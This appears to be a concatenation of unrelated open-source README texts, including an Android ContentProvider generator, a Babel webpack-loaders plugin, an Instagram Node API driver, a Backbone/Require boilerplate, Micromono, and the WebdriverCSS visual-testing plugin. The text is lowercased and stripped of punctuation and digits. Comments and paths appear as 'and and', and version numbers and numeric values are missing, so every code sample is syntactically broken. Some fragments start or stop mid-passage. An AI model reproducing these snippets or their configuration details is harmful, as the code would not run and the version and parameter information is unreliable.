6622342, android contentprovider generator acpg  a tool to generate android contentproviders it takes a set of entity a k a table definitions as the input and generates a contentprovider class an sqliteopenhelper class one columns class per entity one cursor class per entity one contentvalues class per entity one selection class per entity one model interface per entity one bean class per entity optionally there are two possible ways to generate the code  as part of the build script with a gradle plugin  as a one time step using a command line tool the gradle plugin is perhaps the cleaner way in the sense that the generated code won t be part of the source not checked into vcs the configuration is declared inside the gradle script which allows to update it easily alternatively a one time generation can be done typically at the beginning of the project the generated code is part of the source and checked into vcs this allows you to modify it if you need to you can decide which option is the best for your project add this to your app s build gradle groovy buildscript dependencies classpath org jraf acpg gradle plugin    apply plugin org jraf acpg gradleplugin and and this is where you declare a few parameters used to generate the code and and where to find the entity files see entity files below and and optional default value etc and acpg in the root project

folder input folder where to find config json and your entity json files output folder where the resulting files will be generated create one file per entity naming it entityname json inside each file declare your fields a k a columns with a name and a type you can also optionally declare a default value an index flag a documentation and a nullable flag currently the type can be string sqlite type text integer integer long integer float real double real boolean integer date integer byte blob enum integer you can also optionally declare table constraints here is a person json file as an example documentation a human being which is part of a team  fields documentation first name of this person for instance john  name firstname  type string  defaultvalue john documentation last name a k a given name of this person for instance smith  name lastname  type string  nullable true defaultvalue doe name age  type integer  index true name gender  type enum  enumname gender  enumvalues male  female  other value to use when neither male nor female nullable false constraints name uniquename  definition unique firstname lastname on conflict replace defaultorder firstname lastname age desc an id primary key field is automatically implicitly declared for all entities it must not be declared in the json file nullable is optional true by default if documentation is present the value will be copied in javadoc blocks in the generated code the constraints and defaultorder sections are optional a more comprehensive sample is available in the sample app and etc and acpg sample app and etc and acpg folder you can have a look at the corresponding generated code in the etc and sample generated code etc and sample generated code folder by convention you should name your entities and fields in lower case with words separated by   like in the example above if a header txt file is present its contents will be inserted at the top of every generated file when querying a table use the corresponding selection class as shown in this example personselection where new personselection where firstname john or age  cursor c context getcontentresolver query where uri  projection where sel  where args  null when using the results of a query wrap the resulting cursor in the corresponding wrapper class you can then use the generated getters directly as shown in this example personcursor person new personcursor c string lastname person getlastname long age person getage you can also conveniently combine these two facilities by using the query or delete method personselection where new personselection where firstname john or age  orderbyfirstname personcursor person where query context person movetonext string lastname person getlastname long age person getage or use a cursorloader where getcursorloader context when updating or inserting into a table use the corresponding contentvalues class as shown in this example personcontentvalues values new personcontentvalues values putfirstname john putage  context getcontentresolver update values uri  values values  null null values insert context advanced usage  there is limited support for foreign keys and joins here is an example of the syntax fields name mainteamid  type long  nullable false foreignkey table team  ondelete cascade name firstname  type string  nullable false in this example the field mainteamid is a foreign key referencing the primary key of the team table the appropriate foreign key sql constraint is generated if enableforeignkeys is set to true in config json the team table will be automatically joined when querying the person table  getters for team columns are generated in the personcursor wrapper of course if team has foreign keys they will also be handled and recursively  a table is automatically joined if at least one of its columns is included in the projection if the projection is null i e all columns  all the tables are joined caution you should be extra careful when using a null projection with joins because you will get several columns named id in the results foreign keys always reference the id column the implicit primary key of all tables and thus must always be of type long by design only one foreign key to a particular table is allowed per table in the example above only one column in person can point to team loops i e a has a foreign key to b and b has a foreign key to a aren t detected the generator will infinitely loop if they exist cases such as a has a fk to b b has a fk to c a has a fk to c generate ambiguities in the queries because c columns appear twice in the sample app etc and sample and app and src and org and jraf and androidcontentprovidergenerator and sample and app and sampleactivity java you can see an example of how to deal with this case using prefixes and aliases sql s as keyword a sample is available in the sample app sample app folder with the entities in sample app and etc and acpg sample app and etc and acpg you can have a look at the corresponding generated code in the etc and sample generated code etc and sample generated code folder here is the table shema of the sample table shema of the sample etc and sample schema png raw true the sample this is a gradle project and gradlew install to install the gradle plugin to your local maven repo and gradlew shadowjar to build the cli tool similar tools  here is a

48892683, this babel  plugin allows you to use webpack loaders in babel it s now easy to run universal apps on the server without additional build steps to create libraries as usual with babel src out dir lib command to run tests without mocking prebuilding source code for now this plugin is of alpha quality and tested on webpack loaders i use in my projects these loaders are file loader  url loader  css loader  style loader  sass loader  postcss loader the plugin supports all webpack features like loaders chaining webpack plugins and all loaders params it s easy because this plugin just uses webpack three examples run it with npm run example run build it with npm run example build and execute with node build and mycoollibrary and mycoollibrary js  assets and code will be placed at and build and mycoollibrary folder do not run this plugin as part of a webpack frontend configuration this plugin is intended only for backend compilation javascript and and example js import css from and example css console log css modules result  css with the command babeldisablecache  nodeenv example and nodemodules and bin and babel node and example js and you ll get the following console output javascript css modules result main examplemain zyojd  item exampleitem wxon npm install save dev babel cli babel plugin webpack loaders you can try out the examples by cloning this repo and running the following commands npm install npm run example run npm run example build node build and mycoollibrary and mycoollibrary js npm run test i love writing css using sass i like webpack and its loaders chaining plugins settings i wanted to open source a ui library which heavily used css modules sass and other webpack loaders the library consisted of many small modules and every module needed to be available to users independently such as lodash and blabla and blublu with this plugin the heavy build file for the library could be replaced with just one command babel src out dir lib by default babel caches compiled files so any changes in files processed with loaders will not be visible at subsequent builds you need to run all commands with a babeldisablecache  prefix the ava test runner runs each spec relative to its enclosing folder in a new process which hampers this plugins ability to use a relative path for the webpack config an absolute path to the webpack config will work however and you can set one in your babelrc using an env var like this presets es  env ava plugins  babel plugin webpack loaders   config config  verbose false   and then invoke ava something like this config pwd and webpack config ava js babeldisablecache  nodeenv ava ava require babel register src and and test js

4718819, we built sidetap to be an easy to use implementation of the side navigation pattern popularized by apps like sparrow and facebook it solves many common mobile development problems right out of the box here are some of the specific things we like about it lightweight sidetap only weighs k when minifyied and gzipped device support sidetap aims to always deliver the best possible experience for all devices by starting with a basic experience and progressively enhancing it for more capable devices less decisions to make by embracing convention over configuration sidetap let s you start building your mobile interfaces right away simple sidetap provides a flexible foundation for navigating between content panels on mobile devices using an easy to use syntax  build the html structure  instantiate sidetap create a reference to sidetap from within your app var mysidetap new sidetap  call animations any time you want to show a new section you just tell sidetap which content element to animate sidetap will take care of clearing the stage using whatever animation is appropriate for the situation javascript mysidetap showsection element options showsection options callback a function to fire when the switch is complete animation an animation style to use ios  and only current animations are upfrombottom downfromtop infromright infromleft requires jquery only tested with    or zepto js  install grunt npm install g grunt  install grunt contrib npm install grunt contrib  that s it there are a few available commands grunt or grunt build build the css js files grunt watch build the css js files whenever the less or coffee files change as with any software project there s always room for improvement these are some of the things we d like to get added to sidetap in the future more ios like header animations better touch support leaving side navigation open on larger screen devices hello ipad bringing polished version to more devices
6457267, instagram node  nodejs driver for the instagram api npm install instagram node first of all you need to authentify you can use clientid and clientsecret from the app you are building or an accesstoken from a user that use your app some features need an accesstoken to work javascript var ig require instagram node instagram and and every call to ig use overrides the clientid and clientsecret and and or accesstoken previously entered if they exist ig use accesstoken youraccesstoken ig use clientid yourclientid  clientsecret yourclientsecret if you activated signed requests  you need to sign requests that need the write access relationship likes comments with javascript app post and like and mediaid  function req res next var ig require instagram node instagram ig use accesstoken youraccesstoken ig addlike req param mediaid  signrequest clientsecret yourclientsecret  and and then you can specify the request clientreq req and and or the ip on your own ip xxx xxx xxx xxx  function err and and handle err here return res send ok instagram uses the standard oauth authentication flow in order to allow apps to act on a user s behalf therefore the api provides two convenience methods to help you authenticate your users the first getauthorizationurl  can be used to redirect an unauthenticated user to the instagram login screen based on a redirecturi string and an optional options object containing an optional scope array and an optional state string the second method authorizeuser  can be used to retrieve and set an access token for a user allowing your app to act fully on his and her behalf this method takes three parameters a responsecode which is sent as a get parameter once a user has authorized your app and instagram has redirected them back to your authorization redirect uri a redirecturi which is the same one supplied to getauthorizationurl  and a callback that takes two parameters err and result err will be populated if and only if the request to authenticate the user has failed for some reason otherwise it will be null and response will be populated with a json object representing instagram s confirmation reponse that the user is indeed authorized see instagram s authentication below is an example of how one might authenticate a user within an expressjs app javascript var http require http var express require express var api require instagram node instagram var app express app configure function and and the usual api use clientid yourclientid clientsecret yourclientsecret exports authorizeuser function req res res redirect api getauthorizationurl redirecturi scope likes  state a state  exports handleauth function req res api authorizeuser req query code redirecturi function err result if err console log err body res send didn t work else console log yay access token is and result accesstoken res send you made it and and this is where you would initially send users to authorize app get and authorizeuser  exports authorizeuser and and this is your redirect uri app get and handleauth  exports handleauth http createserver app listen app get port  function console log express server listening on port and app get port once you ve setup the api and and or authenticated here is the full list of what you can do javascript and and and users and and and ig user userid  function err result remaining limit and

4435408, backbone require boilerplate brb  a backbone js and require js boilerplate that promotes decoupling your javascript into modules separating business logic from application logic using collections and models and views reusing your javascript between desktop and mobile web versions while using a mobile framework jquery mobile  including non amd compatible third party scripts in your project optimizing all of your javascript minify concatenate etc  and unit testing your javascript  navigate to inside of the backbone require boilerplate folder and type npm install  next type nodemon this will start your node js web server and restart the server any time you make a file change thanks to the wonderful nodemon library  enjoy using backbone lodash require js amdclean js jquery jqueryui jquery mobile twitter bootstrap jasmine and grunt enjoyment optional index html  as you continue down the page to the first script tag you will notice there is a local javascript variable called production  that is used to communicate to your application whether you would like to load production or development css and javascript files to load our production and development css and javascript files you can use the handy boilerplatemvc helper methods included directly in our html page below are the available helper methods loadcss url callback asynchronously includes a css file to a page loadjs file callback asynchronously includes a javascript file to the page loadfiles production obj callback calls the loadcss and loadjs methods internally to asynchronously include our css and javascript files loading files asynchronously prevents our application files from blocking the loading of the ui and allows us the flexibilty to load different css and javascript files if a user is on a mobile and desktop device since the desktop and mobile versions of the boilerplate point require js to two different files including require js asynchronously with the loadjs method provides the flexibility to do that there is a simple javascript mobile browser detection script that stores different production and development css and javascript files within a local config object based on whether a user is using a mobile or desktop browser you do not need to use the provided javascript mobile detection script for your application we provided it for convenience so that you could see an example of how to separate your mobile and desktop javascript logic using require js in production mode your app s single minified and concatenated javascript file is loaded without require js using amdclean js your application s minfied common css file is also included in development mode your app s non minified javascript files are loaded using require js instead of amdclean js your application s non minified common css file is also included config js  this file includes your mobile and desktop require js configurations if we look at our app s require js configurations we will see the first thing being configured are the module paths setting paths allow you to define an alias name and file path for any module that you like typically you want to set a path for any module that will be listed as a dependency in more than one other module eq jquery backbone this saves you some typing since you just have to list the alias name and not the entire file path when listing dependencies after all of the file paths are set you will find the shim configuration added in require js   shim and and backbone backbone and and depends on underscore and lodash and jquery deps underscore  jquery  and and exports the global window backbone object exports backbone the shim configuration also takes the place for the old require js order plugin within the shim configuration you can list files and their dependency tree an example is jquery plugins being dependent on jquery shim and and twitter bootstrap plugins depend on jquery bootstrap jquery mobileinit js  mobileinit js is only used if a mobile browser is detected the require method is used to asynchronously include all of the files and dependencies passed into the first parameter jquery backbone lodash mobilerouter etc into the page after all of those files are included on the page two internal jquery mobile properties are turned off to allow backbone js to handle all of the routing and and prevents all anchor click handling mobile linkbindingenabled false and and disabling this will prevent jquery mobile from handling hash changes mobile hashlisteningenabled false finally a new router instance is instantiated to allow you to use backbone s routing mechanism keep reading below for more clarification you don t need to instantiate a new router instance if you aren t using a backbone router class desktopinit js  desktopinit js is only used if a desktop browser is detected this file is the exact same as mobileinit js except it has a few different dependencies twitter bootstrap instead of jquery mobile etc mobilerouter js  mobilerouter js is where you can include mobile specific scripts that you do not want included in your desktop application this file starts with a define method that lists jquery backbone and view js as dependencies keep in mind that jquery and backbone had already been previously loaded in mobile js but require js is smart enough not to load dependencies more than once it is best practice to list out all of your dependencies for every file regardless of whether or not they expose global objects and are already included in the page this is also especially important for the require js optimizer which needs to determine which files depend on which other files if your dependencies do not expose global objects then it is absolutely mandatory to list it as a dependency since require js does not allow global variables meaning your modules are private and cannot be accessed by other modules or code without explicitly listing them as dependencies the rest of the file is a pretty standard backbone js router class there is currently only one route listed which gets called if there is no hash tag on the url  but feel free to create more for your application you must keep the backbone history start method call since this is what triggers backbone to start reacting to hashchange events when your default route is invoked a new view instance is created which calls the render method immediately to append the header template to the page desktoprouter js  desktoprouter js has the exact same code as mobilerouter js the difference is this is where you can include desktop specific scripts that you do not want included in your mobile web application  view js will be used by both the mobile and desktop versions of your application it starts with a define method that lists all of its dependencies the rest of the file is a pretty standard backbone js view class next you will find an events object here is where all of your view dom event handlers associated with the html element referenced by your view s el property should be stored keep in mind that backbone is using the jquery delegate method so it expects a selector that is within your view s el property i did not include any events by default so you will have to fill those in yourself below is an example of having an events object with one event handler that calls a view s somemethod method when an element with a class name of someelement is clicked and and view event handlers events click someelement somemethod i am also declaring a render method within the view backbone expects you to override the render method with your own functionality so that is what i did all my render method does is append the view s template to the page you do not need to use underscore js templates in fact you don t need to use templates at all i just included them so you would understand how to use them finally i am returning the view class heading html  model js is used by both the mobile and desktop versions of your application it starts with a define method that lists jquery and backbone as dependencies the rest of the file is a pretty standard backbone js model class like other backbone js classes there is an initialize method that acts as the model s constructor function there is also a defaults object that allows you to set default model properties if you wish finally a new model class is returned collection js  collection js is used by both the mobile and desktop versions of your application it starts with a define method that lists jquery backbone and usermodel js as dependencies the rest of the file is a pretty standard backbone js collection class that is used to store all of your backbone models the collection model property is set to indicate that all models that will be within this collection class will be of type model the dependency that is passed into the file finally a new collection class is returned gruntfile js  grunt js is a javascript command line task runner that allows you to easily automate common development tasks such as code linting minification and unit testing running the jasmine tasks with grunt has not been implemented yet backbone require boilerplate sets you up to use require js in development and amdclean js in production by default backbone require boilerplate is in development mode so if you want to try out the production build read the production instructions below production build instructions navigate to the root directory of the backbone require boilerplate folder and type grunt and wait a few seconds for the build to complete if you are on a windows machine you will have to type grunt cmd once the script has finished you will see that both desktopinit min js and mobileinit min js and the mobile min css and desktop min css files will be created and updated next update the production local variable inside of index html to be true and that s it if you have any questions just create in an issue on github specrunner html  this file is the starting point to your jasmine test suite and outputs the results of your jasmine tests this file contains all of your jasmine unit tests only seven tests are provided with unit tests provided for views models collections and routers mobile and desktop i d write more but why spoil your fun read through the tests and use them as examples to write your own the entire file is wrapped in an amd define method with all external module file dependencies listed the jasmine tests should be self explanatory bdd tests are supposed to describe an app s functionality and make sense to non techy folk as well  but if you have any questions just file an issue and i ll respond as quickly as i can what libraries have you included backbone require grunt lodash amdclean jquery jqueryui jquery mobile twitter bootstrap and jasmine w and the jasmine jquery plugin what require js plugins are you using just the require js text plugin since it provides an easy way to keep templates in their own folders instead of just embedding them in your html files i was previously using use js to load non amd compatible scripts but require js   now provides this functionality why are you not using the require js internationalization plugin i found that when i built using the require js optimizer only one lang locale could be included per optimized file that would mean that if you had to support  different langs and locales you would need  different optimized builds desktop and mobile if i am mistaken about this please let me know and i will update the boilerplate with the internationalization plugin a solution for including localized text is in the roadmap and will be included in a future release of the project why are you using grunt for the build grunt comes jam packed with features and plugins to help improve project automation tasks although the main job of grunt within backbone require boilerplate is to run the require js optimizer it is also for other tasks such as jshinting your code what grunt plugins are you using the boilerplate uses the grunt contrib requirejs plugin to run the require js optimizer and the grunt contrib jshint plugin to automate jshint code quality checking both plugins are maintained by the core grunt team what grunt tasks can i use the boilerplate provides test  build  and default tasks the test task will only jshint your code for quality you can run the test task by typing grunt test the build task will concatenate and minify your desktop and mobile javascript and css files using the require js optimizer you can run the build task by typing grunt build the default task will run both the test and build tasks you can run the default task by typing grunt why are you using the import tag to include css files within desktop css and mobile css when creating production builds require js inlines all of the css files included via import tags this means that we can easily include all of our css files within one file and not have any performance concerns when our app get s released to the production in development mode we aren t as concerned with performance do i have to manage different require js configuration settings for the grunt build jasmine tests and mobile and desktop applications no all of the require js configurations are in one place config js and are reused in the different portions of our app that require it do i have to use everything the boilerplate gives me no feel free to update the boilerplate to fit the needs of your application certain things that you might not want and need include templates mobile and desktop versions jquery mobile etc also check out other boilerplate projects within the boilerplatemvc project that may fit your needs better i e brb lite do i need a web server to test the boilerplate yep because the require js text plugin dynamically pulls in template files via ajax which is not allowed with the file and and local extension luckily for you i have provided an easy to use node js web server for convenience why did you not include a package manager such as bower volo or jam i ultimately decided against including a package manager i agree that using a package manager for this boilerplate is the ultimate solution but the js package management space is in a state of flux a browser package management solution has not been adopted by the community yet obviously this may change can i contribute to this project please do i am learning just like you if you want to contribute please send pull requests to the dev branch    january   replaced almond js with amdclean js added plato code complexity support updated to twitter bootstrap  jquery mobile   require js    backbone js    and lodash       may   changed require configuration in both config js and gruntfile js to use baseurl js and app instead of baseurl js    april   all require js configurations are now stored in one place config js instead of three this removes the pain of managing different desktop mobile and jasmine configurations you can see the improved logic inside of index html  specrunner html  and the grunt build the jasmine test runner logic was simplified by removing testinit js and all shim configuration settings for jasmine the jasmine library is now being included directly before require js which guarantees that it will be on the page before any specs are run    april   added grunt js support run the require js optimization build updated the loadjs and loadcss methods and removed the html domcontentloaded event updated all libraries to the latest versions    december   updated the loadcss method to now support an array of arguments removed the loadrequirejs method added the loadjs method supports an array of arguments added a new production local variable inside of index html to easily turn on and off production and development mode    december   added jquery mobile support added jqueryui support upgraded all libs to their latest versions included a node js server for convenience in testing brb removed the add and remove users example and reverted this project back to just a boilerplate added desktop and mobile router jasmine tests added the require js text plugin back in since i now figured out how to use it with jasmine    october   upgraded to require js    upgraded to r js    upgraded to almond js    upgraded to lodash    upgraded to jquery       september   added almond js to the production build process    september   complete rewrite of the boilerplate example the example now illustrates how to make a simple add and remove user table with backbone collections models and views upgraded to lodash    upgraded to jquery       august   added project nickname brb seriously how did i not see that before added jasmine unit tests two unit tests were added for both views and models breaking change the require js text plugin was removed and an inline html template was used instead upgraded to lodash       august   upgraded to lodash       june   upgraded to lodash       june   all modules now return a class instead of an instance the self variable has been removed from all modules scoping issue the require js optimizer build file app build js has been simplified by adding a mainconfigfile option that points to the desktop main file keep in mind that all of your mobile and desktop shims and paths need to be in desktopinit js    june   upgraded to require js    and r js    added anotherview js to demonstrate how to extend backbone js views and classes upgraded model js to now return a model instance instead of a model class updated documentation    june   upgraded to lodash    removed the lodash shim configuration not needed because lodash is amd compatible updated documentation    may   upgraded to require js   text js   and r js   removed use js because require js   now includes this functionality using the shim configuration replaced all the minified javascript files with unminified and documented javascript files you can minify these files using the require js optimizer script provided    may   initial backbone require boilerplate release added

35129342, npm version npm image npm url dependencies dep image dep url downloads downloads image npm url micromono is a framework for developing micro services in monolithic style or reversed it allows you to switch and mix between micro service and monolithic styles without changing the code before they were two things which always connected with vs now with micromono you have the ability to get the best of both worlds npm install micromono account utilizes passport js and exposes its authentication features as a service home service uses the features provided by account service to protect a private page io illustrates how to use socket io websocket in your application you can simply clone this repository and follow the instruction in the example folder to play them on your own machine the only requirement is node js current implementation of micromono is purely in node js and is still in its early stages it uses open standards and has a clearly defined service specification so porting to other languages and platforms is possible and encouraged we need your help to make it better any suggestions pull requests or thoughts are always welcome don t forget to star it on github or share it with others micromono involves  parts of application development web framework http routing middleware page rendering etc remote procedure calls rpc front end code management static asset files of javacript and css in micromono there are  different types of components doc and images and  components png balancer docbalancer serves requests directly from clients and proxies requests to the right services behind it service docservice runs the code which provide the actual feature a service is a standalone package which groups related features together as an unit it could have only one rpc endpoint or it may have a http routing code and client side dependencies you can think of it as a micro monolithic application with everything you need to run that part of the business logic in current node js implementation it is also a npm package so in the package json file you can define npm dependencies as well as the required libraries for client side code but this doesn t mean that you have to write your services in node js we will cover more about this topic in the design section docdesign here s an example that shows how to define a simple service which handles http request and response javascript and and require micromono and get the service base class var service require micromono service and and subclass service class to define your service and and backbone and ampersand style inheritance var simplehttpservice service extend and and route is the object where you define all your routing handlers route get and hello and name function req res and and basically this handler function will be directly attached to and and internal express instance created by micromono so any express and and route handler could be ported to micromono without any modification var name req params name res send hello and name the get and hello and name function req res part in above example equivalents to javascript var app express app get and hello and name  function req res var name req params name res send hello and name for more detailed information about http routing middleware or page rendering please go to web framework docwebframework each service could have an initialization function init you can do some preparation works here for example connect to database or setup internal express server the init function takes no arguments and an instance of promise could to be returned if have async operation in initialization you need to resolve the returned promise after the work has been done or reject it if there s an error let s see an example javascript var bodyparser require body parser var service require micromono service var mongoclient require mongodb mongoclient module exports service extend and and initialization function takes no arguments init function and and get the internal express instance var app this app and and use a middleware app use bodyparser json var self this and and create a new promise instance var promise new promise function resolve reject and and do the async operation connect mongoclient connect      function err db if err and and reject the promise if there s an error reject err return  self db db and and resolve when done resolve  and and init function should return a promise no matter what return promise by default micromono uses expressjs to handle the web request uses socket io for rpc communication but people may have different opinions and everyone could be right even they have different preferences because each combination of developers and teams and products is unique and the best choice is always the one that most fit that s why we always put flexibility as a high priority factor being considered when designing micromono we will cover more about this in web framework adapter docframeworkadapter and rpc adapter docrpcadapter balancer sits in front of all services which actually glues all the services together and boots up a server to serve requests directly from clients you can use the command line command micromono to start up a balancer if you use micromono exclusively or you can have micromono running cohesively within your existing server by adding a few lines of code first we need to install micromono globally npm install g micromono then go to terminal and run micromono service service service dir and services this tells micromono to start the balancer with service and try to find the service in a local directory called services if micromono failed to find the service from local machine it will try to find a service provider from local network we will discuss more about running local and remote doclocalandremote services later the server code is very simple and straight forward below is an example shows how to use micromono together with express server javascript and and require micromono and call to get an instance var micromono require micromono and and require the services you need and and in this step micromono will attempt to locate the required package on your local machine and and if it fails it will try to probe from the network micromono require home micromono require account and and create an express instance and and we don t alter the express instance so you can do what ever you want and and to the express instance and they will work as expected var app require express and and start balancer with the express app micromono runbalancer app then function and and start serving requests app listen  doc and images and  mixed png as we mentioned at the beginning the pros and cons of micro services architecture are obvious and have been widely discussed micromono allows you to choose the right trade offs for the right scenario if you application has  services you may run all the  services on your local dev machine or run  service which you are developing locally and use the rest  of them stable and finished services remotely through network having a completely different setup for deployment or testing services in parallel imagination is your only limitation the most critical thing is being able to use any services locally or remotely without knowing the difference or changing the code micromono gives you this ability by rebuilding the exact service class based on service announcement this is the most important feature micromono brings to the table and you won t feel it as micromono does the job behind the scenes it is true no matter what you are dealing with http request rpc or front end scripts micromono wraps a thin layer on top of the other frameworks express by default so existing applications of supported frameworks should be able to easily be ported without any problems in this section we will go through  topics to understand the web framework part of micromono http routing dochttprouting  middleware docmiddleware and page rendering docrenderpage as you can see in the earlier example you could define http routing handlers by putting the definition in the route object property when you extend the service with following format javascript http method matching string request handler function or array  object key defines the http method and matching string separated with double colons value could be a function which will be the handler of the path or array of functions which contains middleware functions as well as route handler actually you want read more documentation of the framework being used to get better understanding of how routing works as micromono basically maps the definition directly to the underlying framework here is an example of using connect style middleware for a particular route javascript var bodyparser require body parser var service require micromono service module exports service extend route and and parse form data only for this path post and update bodyparser urlencoded  function req res var body req body and and do something with body  normally middleware is just piece of code which can be plugged in into your routing system to modify the http request or response stream on the fly in detail there are  things you can alter request header meta request body stream response header meta response body stream some middleware may modify all  of them some may change  and some just need the information and do nothing e g logging most middleware works fine locally as they are just some code and don t require external and remote resources but some of them you may want to run remotely as services due to the complexity of the configuration in micromono in order to support remote middleware we separate them into  categories semi remote and fully remote middleware services note when we are talking about remote middleware we mean the ability to use that middleware remotely as a service which means you still can use them locally as any other normal middleware you have semi remote middleware modifies only the meta info of request and response or takes over the control of request and response completely authentication middleware would be a perfect example of this scenario let s take a closer look at the whole authentication process  auth middleware gets the request  check if we can get and verify user info from the request data   auth successfully add user info to request and let the request keep going to the next middleware or routing handler   auth failed redirect request to a designated location e g login page as we can see if auth successfully the response stream of routing handler could be sent directly back to the client without going through the auth middleware or the response from auth middleware would be sufficient to send to client without touching any other middleware or routing handler in the case of failure authentication in micromono the above semi remote authentication middleware works like this doc and images and  middleware png  micromono server gets the request from client  proxy the request to right service  service gets the request and proxy the request to remote middleware  remote middleware does the work and responses to the service  depends on the response of remote middleware a request will be modified and will be passed to the next handler b response data from middleware will be sent back to the client directly and the original request will not go any further  the route handler gets the requests and sends response back to micromono server  server gets the response and sends back to the client fully remote middleware is a normal middleware which requires the request and response data stream go through it during the entire life cycle micromono only supports running fully remote middleware in the balancer server service need to define which middleware to use by using the use property javascript var myservice module exports service extend packagepath dirname baseurl and myservice  and and tell micromono to use layout middleware at the balancer side and and for request which matches url and myservice and dashboard baseurl and routeurl layout and dashboard route and dashboard function req res and and a template partial called dashboardtpl will be rendered and and and the result will be composed by layout middleware to generate the final page res render dashboardtpl having any kind of remote middleware will of course slow down the performance dramatically but sometimes it s worth it to reduce the complexity of deployment and provide a more modularized architecture micromono is focused on giving you the most flexibility while allowing you to choose the trade offs doc and images and  render page png javascript var profile module exports service extend packagepath dirname baseurl and  and and tell micromono to use layout middleware at the balancer side and and for request which matches following urls in the array layout and profile  and route and function req res and and response will be re rendered by layout middleware in the balancer process get and profile function req res and and response will be re rendered by layout middleware in the balancer process post and upload function req res and and this will not be touched by layout as it doesn t match the url doc and images and  rpc png doc and images and  asset png

accept null true and and reject connection for whatever reason accept null false and like this if you use the newest version of socket io  x javascript and and accept connection accept and and reject connection for whatever reason accept new error optional reason the name of this callback may be a little confusing while it is called when a not authorized user connects it is also called when there s a error for debugging reasons you are provided with two additional parameters function data object  message string  error bool  accept function socket io  x javascript and and function onauthorizefail data message error accept and and error indicates whether the fail is due to an error or just a unauthorized client if error throw new error message else console log message and and

an critical error function onauthorizefail data message error accept if error throw new error message return accept you can use the message parameter for debugging and logging and etc uses this property was removed in v see socket request user this property is always available from inside a io on connection handler if the user is authorized via passport you can access all the properties from there plus you have the socket request user loggedin property which tells you whether the user is currently authorized or not note this property was named socket handshake user prior to v this function gives you the ability to filter all connected sockets via a user property needs two parameters function io function user example javascript passportsocketio filtersocketsbyuser io function user return user gender female foreach function socket socket emit messsage  hello woman if you happen to have to work with cross origin requests marked by socket io v  as handshake xdomain and by socket io v  as request xdomain then here s a workaround you have to provide the session cookie if you haven t set a name yet do it like this app use express session key your sid key javascript and and note ther s no readcookie function built in and and get your own in the internetz socket io connect and and and window location host query sessionid and readcookie your sid key nope there s nothing to do on the server side just be sure that the cookies names match does not support cookie based sessions eg express cookiesession if the connection fails check if you are requesting from a client via cors check socket handshake xdomain true socket request xdomain true with socket io v as there are no cookies sent for a workaround look at the code above you are always welcome to open an

18198033,  note  webdrivercss isn t yet compatible with webdriverio v  and is not longer maintained if anyone wants to take ownershipt of this project i am happy to assign push permissions css regression testing in webdriverio this plugin is an automatic visual regression testing initialization it enhances a webdriverio instance with an additional command called webdrivercss and enables the possibility to save screenshots of specific parts of your application  define areas within your application that should always look the same  use webdriverio and webdrivercss to write some ee tests and take screenshots of these areas  continue working on your application or website  after a while rerun the tests  if desired areas differ from previous taken screenshots an image diff gets generated and you get notified in your tests var assert require assert and and init webdriverio var client require webdriverio remote desiredcapabilities browsername chrome and and init webdrivercss require webdrivercss init client init webdrivercss startpage   name header  elem header  name hero  elem and and id hero and div    function err res assert iferror err assert ok res header  iswithinmismatchtolerance assert ok res hero  iswithinmismatchtolerance end package you ll need to have it preinstalled on your system brew install graphicsmagick sudo apt get install graphicsmagick please make sure you install the right binaries desired for your system bit vs bit after these dependencies are installed you can install webdrivercss via npm as usual npm install webdrivercss npm install webdriverio if not already installed to use this plugin just call the init function and pass the desired webdriverio instance as parameter additionally you can define some options to configure the plugin after that the webdrivercss command will be available only for this instance path where all screenshots get saved path where all screenshot diffs get saved number between  and  that defines the degree of mismatch to consider two images as identical increasing this value will decrease test coverage if set all screenshots will be taken in different screen widths e g for responsive design tests updates baseline images if comparison keeps failing and and create a webdriverio instance var client require webdriverio remote desiredcapabilities browsername phantomjs init and and initialise webdrivercss for client instance require webdrivercss init client and and example options screenshotroot my shots  failedcomparisonsroot diffs  mismatchtolerance   screenwidth  webdrivercss enhances an webdriverio instance with an command called webdrivercss client webdrivercss someid  options  callback it provides options that will help you to define your areas exactly and exclude parts that are unrelevant for design e g content additionally it allows you to include the responsive design in your regression tests easily the following options are available name of the captured element define a fixed width for your screenshot define a fixed height for your screenshot take screenshot at an exact xy postion requires width and height option take screenshot at an exact xy postion requires width and height option that queries one or multiple elements or you can define x and y values which stretch a rectangle or polygon can be used to ignore color differences or differences caused by antialising artifacts in the screenshot comparison the following paragraphs will give you a more detailed insight how to use these options properly when using this plugin you can decide how to handle design breaks you can either just work with the captured screenshots or you could even break your integration test at this position the following example shows how to handle design breaks within integration tests var assert require assert describe my website should always look the same function it header should look the same function done client webdrivercss header  name header  elem header  function errres assert iferror err and and this will break the test if screenshot is not within the mismatch tolerance assert ok res header  iswithinmismatchtolerance  call done and and the res variable will be an object containing details on the screenshots taken it will have properties matching each element name and the value of those properties will contain an array of screenshots at each resolution for example the res object for the code above would be header baselinepath webdrivercss and header header baseline png  message mismatch tolerance not exceeded   baseline didn t change  mismatchpercentage  isexactsameimage true issamedimensions true iswithinmismatchtolerance true applitools eyes is a comprehensive automated ui validation solution with really smart image matching algorithms that are unique in this area as a cloud service it makes your regression tests available everywhere and accessible to everyone in your team and its automated maintenance features simplify baseline maintenance in order to work with applitools eyes you need to sign up and obtain an api key you can sign up for a var assert require assert and and create a webdriverio instance var client require webdriverio remote desiredcapabilities browsername chrome and and initialise webdrivercss for client instance require webdrivercss init client key your personal api key init name test name  elem someelement  and and  function err res assert iferror err assert equal res steps res strictmatches end the following options might be interesting if you want to synchronize your taken images with for more information on that api string url to api interface user string user name only necessary if api requires basic authentication or oauth key string assigned user key only necessary if api requires basic authentication or oauth the most powerful feature of webdrivercss is the possibility to define specific areas for your regression tests when calling the command webdrivercss will always take a screenshot of the whole website after that it crops the image and creates a single copy for each element if you want to capture multiple images on one page make sure you pass an array of options to the command the screenshot capturing process can take a while depending on the document size of the website once you interact with the page by clicking on links open layers or navigating to a new site you should call the webdrivercss command to take a new screenshot specify x and y coordinates to cover a more exact area webdrivercss githubform  name github signup  elem site container div marketing section marketing section signup div container form will capture the following tip do right click on the desired element then click on inspect element  then hover over the desired element in devtools open the context menu and click on copy css path to get the exact css selector the following example uses xy coordinates to capture a more exact area you should also pass a screenwidth option to make sure that your xy parameters map perfect on the desired area webdrivercss headerbar  name headerbar  x  y  width  height  screenwidth  sometimes it is unavoidable that content gets captured and from time to time this content will change of course this would break all tests to prevent this you can determine areas which will get covered in black and will not be considered anymore here is an example webdrivercss tumblrpage  name startpage  exclude themegarden div section carousel div carouselslides  and and id themegarden and div and section   and and id themegarden and div and section  screenwidth  instead of using a selector strategy you can also exclude areas by specifying xy values which form a rectangle webdrivercss 